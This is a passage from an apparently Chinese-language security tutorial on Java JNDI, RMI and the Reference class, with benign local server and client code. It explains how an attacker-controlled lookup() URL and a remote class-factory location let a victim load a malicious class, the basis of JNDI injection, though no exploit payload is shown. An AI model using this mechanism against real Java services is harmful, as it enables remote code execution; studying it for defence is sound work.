class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<ul>
<li>实现代码</li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">InitialContext initialContext = new InitialContext();</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="常用方法">常用方法<a href="#常用方法" class="hash-link" aria-label="常用方法的直接链接" title="常用方法的直接链接">​</a></h4>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//将名称绑定到对象。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">bind(Name name, Object obj) </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">list(String name) </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//检索命名对象。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lookup(String name) </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//将名称绑定到对象，覆盖任何现有绑定。 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rebind(String name, Object obj) </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//取消绑定命名对象。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">unbind(String name) </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<ul>
<li>实现代码</li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.InitialContext;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.NamingException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.rmi.RemoteException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Client </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main( String[] args ) throws NamingException, RemoteException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String uri = &quot;rmi://127.0.0.1:1099/test&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        InitialContext initialContext = new InitialContext();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        HelloInterface helloInterface = (HelloInterface) initialContext.lookup(uri);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(helloInterface.says(&quot;hello&quot;));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="reference类">Reference类<a href="#reference类" class="hash-link" aria-label="Reference类的直接链接" title="Reference类的直接链接">​</a></h3>
<p>该类也是在<code>javax.naming</code>的一个类，该类表示对在命名/目录系统外部找到的对象的引用。提供了JNDI中类的引用功能。</p>
<p>在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。具体可以查看<a href="https://blog.csdn.net/ericxyy/article/details/2012287" target="_blank" rel="noopener noreferrer">Java技术回顾之JNDI：命名和目录服务基本概念</a>。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="构造方法-1">构造方法<a href="#构造方法-1" class="hash-link" aria-label="构造方法的直接链接" title="构造方法的直接链接">​</a></h4>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">//为类名为“className”的对象构造一个新的引用。  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Reference(String className) </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//为类名为“className”的对象和地址构造一个新引用。 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Reference(String className, RefAddr addr) </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Reference(String className, RefAddr addr, String factory, String factoryLocation) </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">//为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Reference(String className, String factory, String factoryLocation)  </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<ul>
<li>实现代码</li>
</ul>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">String url = &quot;http://127.0.0.1:8080&quot;;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Reference reference = new Reference(&quot;test&quot;, &quot;test&quot;, url);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<blockquote>
<p>在使用Reference时，我们可以直接将对象传入构造方法中，当被调用时，对象的方法就会被触发，创建Reference实例时几个比较关键的属性：</p>
<p>参数1：<code>className</code> - 远程加载时所使用的类名</p>
<p>参数2：<code>classFactory</code> - 加载的<code>class</code>中需要实例化类的名称</p>
<p>参数3：<code>classFactoryLocation</code> - 提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>协议</p>
</blockquote>
<p>Reference类表示对存在于命名/目录系统以外的对象的引用。如果远程获取 RMI 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化。</p>
<p>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。</p>
<p><strong>[补充](#JNDI Naming Reference)</strong></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="常用方法-1">常用方法<a href="#常用方法-1" class="hash-link" aria-label="常用方法的直接链接" title="常用方法的直接链接">​</a></h4>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">void add(int posn, RefAddr addr) </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	将地址添加到索引posn的地址列表中。  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">void add(RefAddr addr) </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	将地址添加到地址列表的末尾。  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">void clear() </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	从此引用中删除所有地址。  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RefAddr get(int posn) </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	检索索引posn上的地址。  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RefAddr get(String addrType) </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	检索地址类型为“addrType”的第一个地址。  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Enumeration&lt;RefAddr&gt; getAll() </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	检索本参考文献中地址的列举。  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">String getClassName() </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	检索引用引用的对象的类名。  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">String getFactoryClassLocation() </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	检索此引用引用的对象的工厂位置。  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">String getFactoryClassName() </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	检索此引用引用对象的工厂的类名。    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Object remove(int posn) </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	从地址列表中删除索引posn上的地址。  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">int size() </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	检索此引用中的地址数。  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">String toString() </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	生成此引用的字符串表示形式。 </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="jndi代码实现">JNDI代码实现<a href="#jndi代码实现" class="hash-link" aria-label="JNDI代码实现的直接链接" title="JNDI代码实现的直接链接">​</a></h2>
<p>在JNDI中提供了绑定和查找的方法</p>
<ul>
<li><strong>bind(Name name, Object obj)</strong> ：将名称绑定到对象中</li>
<li><strong>lookup(String name)</strong>： 通过名字检索执行的对象</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="实现过程">实现过程<a href="#实现过程" class="hash-link" aria-label="实现过程的直接链接" title="实现过程的直接链接">​</a></h3>
<p>类似rmi的实现过程，只不过最后绑定和检索的时候有一点差别。</p>
<ul>
<li>定义远程接口</li>
<li>服务端实现远程接口</li>
<li>服务端注册远程对象</li>
<li>客户端调用接口</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="实现举例">实现举例<a href="#实现举例" class="hash-link" aria-label="实现举例的直接链接" title="实现举例的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="hellointerfaceclass定义远程接口">HelloInterface.class（定义远程接口）<a href="#hellointerfaceclass定义远程接口" class="hash-link" aria-label="HelloInterface.class（定义远程接口）的直接链接" title="HelloInterface.class（定义远程接口）的直接链接">​</a></h4>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.rmi.Remote;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.rmi.RemoteException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public interface HelloInterface extends Remote {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    String says (String name) throws RemoteException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="helloimplclasshellointerface远程接口实现类">HelloImpl.class（HelloInterface远程接口实现类）<a href="#helloimplclasshellointerface远程接口实现类" class="hash-link" aria-label="HelloImpl.class（HelloInterface远程接口实现类）的直接链接" title="HelloImpl.class（HelloInterface远程接口实现类）的直接链接">​</a></h4>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.rmi.RemoteException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.rmi.server.UnicastRemoteObject;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class HelloImpl extends UnicastRemoteObject implements HelloInterface{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    protected HelloImpl() throws RemoteException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public String says(String name) throws RemoteException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return &quot;test &quot; + name;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="serverclass注册远程对象并绑定">Server.class（注册远程对象并绑定）<a href="#serverclass注册远程对象并绑定" class="hash-link" aria-label="Server.class（注册远程对象并绑定）的直接链接" title="Server.class（注册远程对象并绑定）的直接链接">​</a></h4>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.Context;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.InitialContext;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.NamingException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.rmi.AlreadyBoundException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.rmi.RemoteException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.rmi.registry.LocateRegistry;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.Properties;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Server {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) throws RemoteException, AlreadyBoundException, NamingException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Properties env = new Properties();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        env.put(Context.PROVIDER_URL,&quot;rmi://127.0.0.1:1099&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //初始化环境</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        InitialContext ctx = new InitialContext(env);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 创建一个注册表</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        LocateRegistry.createRegistry(1099);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 远程调用对象</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        HelloInterface hello = new HelloImpl();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 绑定</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ctx.bind(&quot;test&quot;, hello);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="clientclass远程调用">Client.class（远程调用）<a href="#clientclass远程调用" class="hash-link" aria-label="Client.class（远程调用）的直接链接" title="Client.class（远程调用）的直接链接">​</a></h4>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">package org.example;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.InitialContext;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.naming.NamingException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import java.rmi.RemoteException;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Client </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main( String[] args ) throws NamingException, RemoteException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        //初始化环境</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        InitialContext init = new InitialContext();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		//JNDI的方式获取远程对象</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        HelloInterface hello = (HelloInterface) init.lookup(&quot;rmi://127.0.0.1:1099/test&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        // 调用方法</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        System.out.println(hello.says(&quot;123&quot;));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" alt="image-20210808180454222" src="/assets/images/image-20210808180454222-1de78dee3e245606ad3868d5974b151f.png" width="3584" height="2240" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="jndi动态协议转换">JNDI动态协议转换<a href="#jndi动态协议转换" class="hash-link" aria-label="JNDI动态协议转换的直接链接" title="JNDI动态协议转换的直接链接">​</a></h2>
<p>我们上面的demo提前配置了jndi的初始化环境，还配置了<code>Context.PROVIDER_URL</code>，这个属性指定了到哪里加载本地没有的类，所以，上面的demo中
<code>init.lookup(&quot;rmi://127.0.0.1:1099/test&quot;)</code>这一处代码改为<code>init.lookup(&quot;test&quot;)</code>也是没啥问题的。</p>
<p>那么动态协议转换是个什么意思呢？其实就是说即使提前配置了<code>Context.PROVIDER_URL</code>属性，当我们调用<code>lookup()</code>方法时，如果<code>lookup</code>方法的参数像demo中那样是一个<code>uri地址</code>，那么客户端就会去<code>lookup()</code>方法参数指定的<code>uri</code>中加载远程对象，而不是去<code>Context.PROVIDER_URL</code>设置的地址去加载对象(如果感兴趣可以跟一下源码，可以看到具体的实现）。</p>
<p><strong>正是因为有这个特性，才导致当<code>lookup()</code>方法的参数可控时，攻击者可以通过提供一个恶意的url地址来控制受害者加载攻击者指定的恶意类。</strong></p>
<p>但是你以为直接让受害者去攻击者指定的rmi注册表加载一个类回来就能完成攻击吗，是不行的，因为受害者本地没有攻击者提供的类的class文件，所以是调用不了方法的，所以我们需要借助接下来要提到的东西。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="jndi-naming-reference">JNDI Naming Reference<a href="#jndi-naming-reference" class="hash-link" aria-label="JNDI Naming Reference的直接链接" title="JNDI Naming Reference的直接链接">​</a></h2>
<p><code>Reference类</code>表示对存在于命名/目录系统以外的对象的引用。如果远程获取 RMI 服务上的对象为 Reference 类或者其子类，则在客户端获取到远程对象存根实例时，可以从其他服务器上加载 class 文件来进行实例化。</p>
<p>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。</p>
<p>在使用Reference时，我们可以直接将对象传入构造方法中，当被调用时，对象的方法就会被触发，创建Reference实例时几个比较关键的属性：</p>
<ul>
<li><code>className</code>：远程加载时所使用的类名；</li>
<li><code>classFactory</code>：加载的class中需要实例化类的名称；</li>
<li><code>classFactoryLocation</code>：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议；</li>
</ul>
<p>当然，要把一个对象绑定到<code>RMI注册表</code>中，这个对象需要继承<code>UnicastRemoteObject</code>，但是<code>Reference</code>没有继承它，所以我们还需要封装一下它，用 <code>ReferenceWrapper</code> 包裹一下<code>Reference</code>实例对象，这样就可以将其绑定到<code>RMI注册表</code>，并被远程访问到了</p>
